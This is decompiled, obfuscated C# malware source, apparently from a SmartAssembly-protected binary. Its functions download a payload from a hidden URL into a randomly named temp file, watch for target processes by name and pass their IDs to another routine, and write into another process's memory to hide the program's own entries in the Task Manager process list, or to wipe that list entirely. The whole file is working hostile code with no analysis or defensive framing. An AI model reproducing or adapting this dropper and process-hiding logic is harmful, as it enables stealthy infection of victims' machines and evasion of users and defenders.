using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace AFBGXefvzhgrS;

internal sealed class QyQSpzVVucymSlm
{
	private struct RjFpDjGdcLF
	{
		public uint JhZhphRPyJacE;

		public IntPtr JkCaJUBVsKejL;

		public IntPtr eHXNDnvrwFZk;

		public uint AbbTWDxedguNH;

		public uint yYwVCjwAaZFXr;

		public IntPtr JLlDjzzEbCXQOO;

		public uint nAaXruzNYpTA;

		public int WGHQyNDkrNNqV;

		public IntPtr mJfiSNQKRojEezq;
	}

	private static volatile bool KHbiKsRSfwpqN;

	public static volatile bool BROqgJXlOe;

	[NonSerialized]
	internal static GetString getString_0;

	public static string adUqsFiZPSE()
	{
		string empty = string.Empty;
		if (IntPtr.Size == 8)
		{
			return PQmbibhCbUrjJntw(new Uri(getString_0(107389381)));
		}
		return PQmbibhCbUrjJntw(new Uri(getString_0(107389304)));
	}

	public static string PQmbibhCbUrjJntw(Uri uri_0)
	{
		try
		{
			string path = Path.GetRandomFileName().Replace(getString_0(107390803), getString_0(107393803)).Remove(0, 3) + getString_0(107390647);
			WebClient webClient = new WebClient();
			webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
			return Path.Combine(Path.GetTempPath(), path);
		}
		catch
		{
		}
		return string.Empty;
	}

	public static Process WAQZPeyaYvDI(string string_0)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		Process process;
		while (true)
		{
			if (num < processes.Length)
			{
				process = processes[num];
				if (process.ProcessName.Contains(string_0))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return process;
	}

	public static void AcTEzZKhqSQqpG(string[] string_0)
	{
		string text = adUqsFiZPSE();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		while (true)
		{
			foreach (string string_ in string_0)
			{
				Process process = WAQZPeyaYvDI(string_);
				if (process != null)
				{
					string text2 = process.Id.ToString();
					qXROyYvaHOl.gQxVlDcwnbXqeZ(text, text2 + getString_0(107388651) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName));
				}
			}
			Thread.Sleep(200);
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(int int_0, bool bool_0, uint uint_0);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0, int int_1);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr yYyqDqjCXR);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr WzvruOpZXpkG, IntPtr jfnNhdGqjMWrkW, byte[] dNdMDMwdbKa, uint GjIkREAwhEcICoxd, out UIntPtr bPYlAuKlTuv);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr JJyGcyWVWpjtLb, IntPtr aGEMDAXPOoW, [Out] byte[] LNlhiBuQRvTVYv, int hZJcVLEQbapj, out UIntPtr uiVvxRevchk);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr CbrttujUKUi, out uint sUUNDdUEsdLrhZ);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr intptr_0, uint uint_0, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string string_0, string string_1);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr intptr_0, IntPtr intptr_1, string string_0, string string_1);

	private static byte[] BlYsAKENnFDaOG(object object_0)
	{
		int num = Marshal.SizeOf(object_0);
		byte[] array = new byte[num];
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		Marshal.StructureToPtr(object_0, intPtr, fDeleteOld: true);
		Marshal.Copy(intPtr, array, 0, num);
		Marshal.FreeHGlobal(intPtr);
		return array;
	}

	private static IntPtr LyljawnanJQSmP(uint uint_0)
	{
		return OpenProcess(56, bool_0: false, uint_0);
	}

	private static void apxyeTaFnVi(IntPtr intptr_0)
	{
		CloseHandle(intptr_0);
	}

	private static IntPtr mqrnjZmAArX(uint uint_0, IntPtr intptr_0)
	{
		return VirtualAllocEx(intptr_0, IntPtr.Zero, uint_0, 12288, 4);
	}

	private static void REuGXvlBrApK(IntPtr intptr_0, IntPtr intptr_1, uint uint_0)
	{
		VirtualFreeEx(intptr_0, intptr_1, uint_0, 32768);
	}

	private static IntPtr jopfUhQyyIYG()
	{
		IntPtr intPtr = FindWindow(getString_0(107388646), getString_0(107388653));
		if (intPtr == IntPtr.Zero)
		{
			intPtr = FindWindow(getString_0(107388588), getString_0(107388579));
			intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107388588), null);
			return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107388594), getString_0(107388541));
		}
		intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107388588), null);
		return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107388594), getString_0(107388560));
	}

	private static IntPtr NXWviHpAUE(IntPtr intptr_0)
	{
		return SendMessage(intptr_0, 4100u, IntPtr.Zero, IntPtr.Zero);
	}

	private static void CBNdQCYSStWhVmi(IntPtr intptr_0, IntPtr intptr_1)
	{
		SendMessage(intptr_0, 4104u, intptr_1, IntPtr.Zero);
	}

	private static void JIfWNnCxnsd(IntPtr intptr_0)
	{
		SendMessage(intptr_0, 4124u, IntPtr.Zero, IntPtr.Zero);
	}

	private static string IEUQddMKDFEuX(IntPtr intptr_0, IntPtr intptr_1)
	{
		byte[] array = new byte[50];
		RjFpDjGdcLF rjFpDjGdcLF = default(RjFpDjGdcLF);
		GetWindowThreadProcessId(intptr_0, out var sUUNDdUEsdLrhZ);
		IntPtr intPtr = LyljawnanJQSmP(sUUNDdUEsdLrhZ);
		IntPtr intPtr2 = mqrnjZmAArX((uint)Marshal.SizeOf(rjFpDjGdcLF), intPtr);
		IntPtr intPtr3 = mqrnjZmAArX(50u, intPtr);
		rjFpDjGdcLF.JkCaJUBVsKejL = intptr_1;
		rjFpDjGdcLF.eHXNDnvrwFZk = (IntPtr)0;
		rjFpDjGdcLF.nAaXruzNYpTA = 50u;
		rjFpDjGdcLF.JLlDjzzEbCXQOO = intPtr3;
		WriteProcessMemory(intPtr, intPtr2, BlYsAKENnFDaOG(rjFpDjGdcLF), (uint)Marshal.SizeOf(rjFpDjGdcLF), out var bPYlAuKlTuv);
		SendMessage(intptr_0, 4141u, intptr_1, intPtr2);
		ReadProcessMemory(intPtr, intPtr3, array, 50, out bPYlAuKlTuv);
		REuGXvlBrApK(intPtr, intPtr2, (uint)Marshal.SizeOf(rjFpDjGdcLF));
		REuGXvlBrApK(intPtr, intPtr3, 50u);
		apxyeTaFnVi(intPtr);
		return Encoding.ASCII.GetString(array);
	}

	private static void DPxjdbUuFXJhn(string string_0)
	{
		IntPtr intPtr = jopfUhQyyIYG();
		if (!(intPtr != IntPtr.Zero))
		{
			return;
		}
		int num = (int)NXWviHpAUE(intPtr);
		for (int i = 0; i < num; i++)
		{
			string text = IEUQddMKDFEuX(intPtr, (IntPtr)i);
			if (text.Contains(string_0))
			{
				CBNdQCYSStWhVmi(intPtr, (IntPtr)i);
			}
		}
	}

	private static void kvjOmyIXpxfTBX()
	{
		IntPtr intPtr = jopfUhQyyIYG();
		if (intPtr != IntPtr.Zero)
		{
			JIfWNnCxnsd(intPtr);
			JIfWNnCxnsd(intPtr);
			JIfWNnCxnsd(intPtr);
			JIfWNnCxnsd(intPtr);
			JIfWNnCxnsd(intPtr);
		}
	}

	public static void ddVZGGumtVLZ()
	{
		Thread thread = new Thread(yLBGTnBdKjgfikg);
		thread.Start();
	}

	private static void yLBGTnBdKjgfikg()
	{
		while (!KHbiKsRSfwpqN)
		{
			if (BROqgJXlOe)
			{
				DPxjdbUuFXJhn(Process.GetCurrentProcess().ProcessName + getString_0(107390647));
				Thread.Sleep(525);
			}
			else
			{
				kvjOmyIXpxfTBX();
				Thread.Sleep(1000);
			}
		}
		KHbiKsRSfwpqN = false;
	}

	static QyQSpzVVucymSlm()
	{
		Strings.CreateGetStringDelegate(typeof(QyQSpzVVucymSlm));
		KHbiKsRSfwpqN = false;
		BROqgJXlOe = true;
	}
}
